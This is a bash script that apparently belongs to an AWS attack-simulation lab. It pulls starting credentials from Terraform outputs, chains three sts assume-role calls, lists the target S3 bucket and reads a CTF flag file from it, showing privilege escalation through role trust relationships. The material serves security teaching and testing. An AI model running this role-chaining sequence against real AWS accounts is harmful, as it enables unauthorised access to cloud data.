#!/bin/bash

# Demo script for 3-hop role assumption chain attack
# This script demonstrates how to traverse the role chain to access the S3 bucket

set -e  # Exit on any error

# Configuration
REGION="us-west-2"

# Disable paging for AWS CLI
export AWS_PAGER=""

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'
NC='\033[0m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Navigate to the Terraform root directory (6 levels up from scenario directory)
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
TERRAFORM_ROOT="$(cd "$SCRIPT_DIR/../../../../../.." && pwd)"

echo "🔍 Retrieving credentials from Terraform outputs..."
cd "$TERRAFORM_ROOT"

# Get the grouped module output
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_multi_hop_to_bucket_role_chain_to_s3.value // empty')

if [ -z "$MODULE_OUTPUT" ] || [ "$MODULE_OUTPUT" == "null" ]; then
    echo "❌ Error: Could not retrieve module outputs."
    echo ""
    echo "Possible causes:"
    echo "  1. The scenario is not enabled in terraform.tfvars"
    echo "     Add: enable_single_account_privesc_multi_hop_to_bucket_role_chain_to_s3 = true"
    echo ""
    echo "  2. Terraform has not been applied yet"
    echo "     Run: terraform apply"
    echo ""
    echo "  3. You are not in the correct directory"
    echo "     Current Terraform root: $TERRAFORM_ROOT"
    echo ""
    exit 1
fi

# Extract credentials and resource information from grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
INITIAL_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.initial_role_arn')
INTERMEDIATE_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.intermediate_role_arn')
S3_ACCESS_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.s3_access_role_arn')
S3_BUCKET_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.s3_bucket_name')
STARTING_USER_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_name')

READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo "Error: Could not find readonly credentials in terraform output"
    exit 1
fi

echo "✅ Retrieved credentials for starting user: $STARTING_USER_NAME"
echo "📋 Initial Role ARN: $INITIAL_ROLE_ARN"
echo "📋 Intermediate Role ARN: $INTERMEDIATE_ROLE_ARN"
echo "📋 S3 Access Role ARN: $S3_ACCESS_ROLE_ARN"
echo "📋 Target S3 Bucket: $S3_BUCKET_NAME"

cd - > /dev/null

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Source demo permissions library for validation restriction
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"

# Restrict helpful permissions during validation run
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"

export AWS_DEFAULT_REGION="$REGION"

echo ""
echo "🎯 Starting 3-hop role assumption chain attack..."
echo "=================================================="

# [EXPLOIT] Step 1: Assume the initial role
echo ""
echo "🔄 Step 1: Assuming initial role..."
echo "Role ARN: $INITIAL_ROLE_ARN"

use_starting_creds
show_attack_cmd "Attacker" "aws sts assume-role --role-arn $INITIAL_ROLE_ARN --role-session-name "attack-initial-role" --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' --output text"
INITIAL_CREDENTIALS=$(aws sts assume-role \
    --role-arn $INITIAL_ROLE_ARN \
    --role-session-name "attack-initial-role" \
    --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' \
    --output text)

INITIAL_ACCESS_KEY=$(echo $INITIAL_CREDENTIALS | cut -d' ' -f1)
INITIAL_SECRET_KEY=$(echo $INITIAL_CREDENTIALS | cut -d' ' -f2)
INITIAL_SESSION_TOKEN=$(echo $INITIAL_CREDENTIALS | cut -d' ' -f3)

echo "✅ Successfully assumed initial role"

# [EXPLOIT] Step 2: Assume the intermediate role using the initial role's credentials
echo ""
echo "🔄 Step 2: Assuming intermediate role..."
echo "Role ARN: $INTERMEDIATE_ROLE_ARN"

show_attack_cmd "Attacker" "AWS_ACCESS_KEY_ID=\$INITIAL_ACCESS_KEY AWS_SECRET_ACCESS_KEY=\$INITIAL_SECRET_KEY AWS_SESSION_TOKEN=\$INITIAL_SESSION_TOKEN aws sts assume-role --region $REGION --role-arn $INTERMEDIATE_ROLE_ARN --role-session-name "attack-intermediate-role" --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' --output text"
INTERMEDIATE_CREDENTIALS=$(AWS_ACCESS_KEY_ID=$INITIAL_ACCESS_KEY \
    AWS_SECRET_ACCESS_KEY=$INITIAL_SECRET_KEY \
    AWS_SESSION_TOKEN=$INITIAL_SESSION_TOKEN \
    aws sts assume-role \
    --region $REGION \
    --role-arn $INTERMEDIATE_ROLE_ARN \
    --role-session-name "attack-intermediate-role" \
    --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' \
    --output text)

INTERMEDIATE_ACCESS_KEY=$(echo $INTERMEDIATE_CREDENTIALS | cut -d' ' -f1)
INTERMEDIATE_SECRET_KEY=$(echo $INTERMEDIATE_CREDENTIALS | cut -d' ' -f2)
INTERMEDIATE_SESSION_TOKEN=$(echo $INTERMEDIATE_CREDENTIALS | cut -d' ' -f3)

echo "✅ Successfully assumed intermediate role"

# [EXPLOIT] Step 3: Assume the S3 access role using the intermediate role's credentials
echo ""
echo "🔄 Step 3: Assuming S3 access role..."
echo "Role ARN: $S3_ACCESS_ROLE_ARN"

show_attack_cmd "Attacker" "AWS_ACCESS_KEY_ID=\$INTERMEDIATE_ACCESS_KEY AWS_SECRET_ACCESS_KEY=\$INTERMEDIATE_SECRET_KEY AWS_SESSION_TOKEN=\$INTERMEDIATE_SESSION_TOKEN aws sts assume-role --region $REGION --role-arn $S3_ACCESS_ROLE_ARN --role-session-name "attack-s3-access-role" --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' --output text"
S3_CREDENTIALS=$(AWS_ACCESS_KEY_ID=$INTERMEDIATE_ACCESS_KEY \
    AWS_SECRET_ACCESS_KEY=$INTERMEDIATE_SECRET_KEY \
    AWS_SESSION_TOKEN=$INTERMEDIATE_SESSION_TOKEN \
    aws sts assume-role \
    --region $REGION \
    --role-arn $S3_ACCESS_ROLE_ARN \
    --role-session-name "attack-s3-access-role" \
    --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' \
    --output text)

S3_ACCESS_KEY=$(echo $S3_CREDENTIALS | cut -d' ' -f1)
S3_SECRET_KEY=$(echo $S3_CREDENTIALS | cut -d' ' -f2)
S3_SESSION_TOKEN=$(echo $S3_CREDENTIALS | cut -d' ' -f3)

echo "✅ Successfully assumed S3 access role"

# [EXPLOIT] Step 4: List contents of the S3 bucket (using final assumed-role credentials)
echo ""
# Get the actual bucket name by listing S3 buckets and finding the one with our prefix
echo "🔄 Step 4: Listing contents of S3 bucket: $S3_BUCKET_NAME"

show_attack_cmd "Attacker" "AWS_ACCESS_KEY_ID=\$S3_ACCESS_KEY AWS_SECRET_ACCESS_KEY=\$S3_SECRET_KEY AWS_SESSION_TOKEN=\$S3_SESSION_TOKEN aws s3 ls s3://$S3_BUCKET_NAME --region $REGION"
AWS_ACCESS_KEY_ID=$S3_ACCESS_KEY \
    AWS_SECRET_ACCESS_KEY=$S3_SECRET_KEY \
    AWS_SESSION_TOKEN=$S3_SESSION_TOKEN \
    aws s3 ls s3://$S3_BUCKET_NAME --region $REGION

# [EXPLOIT] Step 5: Read the CTF flag from the target bucket
echo ""
echo "🔄 Step 5: Reading flag.txt from target bucket..."

show_attack_cmd "Attacker" "AWS_ACCESS_KEY_ID=\$S3_ACCESS_KEY AWS_SECRET_ACCESS_KEY=\$S3_SECRET_KEY AWS_SESSION_TOKEN=\$S3_SESSION_TOKEN aws s3 cp s3://$S3_BUCKET_NAME/flag.txt - --region $REGION"
FLAG_VALUE=$(AWS_ACCESS_KEY_ID=$S3_ACCESS_KEY \
    AWS_SECRET_ACCESS_KEY=$S3_SECRET_KEY \
    AWS_SESSION_TOKEN=$S3_SESSION_TOKEN \
    aws s3 cp s3://$S3_BUCKET_NAME/flag.txt - --region $REGION)

echo ""
echo "📄 Flag:"
echo "======================"
echo "$FLAG_VALUE"
echo "======================"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n\033[1;33mAttack Commands:\033[0m"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo ""
echo "🎉 SUCCESS! Successfully traversed the 3-hop role assumption chain!"
echo "================================================================"
echo "📊 Attack Summary:"
echo "   - Started as: $STARTING_USER_NAME"
echo "   - Assumed initial role: $INITIAL_ROLE_ARN"
echo "   - Assumed intermediate role: $INTERMEDIATE_ROLE_ARN"
echo "   - Assumed S3 access role: $S3_ACCESS_ROLE_ARN"
echo "   - Accessed S3 bucket: $S3_BUCKET_NAME"
echo "   - CTF Flag: $FLAG_VALUE"
echo ""
echo "💡 This demonstrates a privilege escalation attack through role chaining!"
echo "   An attacker with minimal permissions can gain access to sensitive S3 data"
echo "   by exploiting the trust relationships between roles."

# Clean up environment variables
unset INITIAL_ACCESS_KEY INITIAL_SECRET_KEY INITIAL_SESSION_TOKEN
unset INTERMEDIATE_ACCESS_KEY INTERMEDIATE_SECRET_KEY INTERMEDIATE_SESSION_TOKEN

# Standardized test results output
echo "TEST_RESULT:prod_simple_explicit_role_assumption_chain:SUCCESS"
echo "TEST_DETAILS:prod_simple_explicit_role_assumption_chain:Successfully demonstrated role assumption chain with S3 access"
echo "TEST_METRICS:prod_simple_explicit_role_assumption_chain:roles_assumed=3,s3_access_gained=true,flag_retrieved=true"
unset S3_ACCESS_KEY S3_SECRET_KEY S3_SESSION_TOKEN

# Restore helpful permissions for manual exploration
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
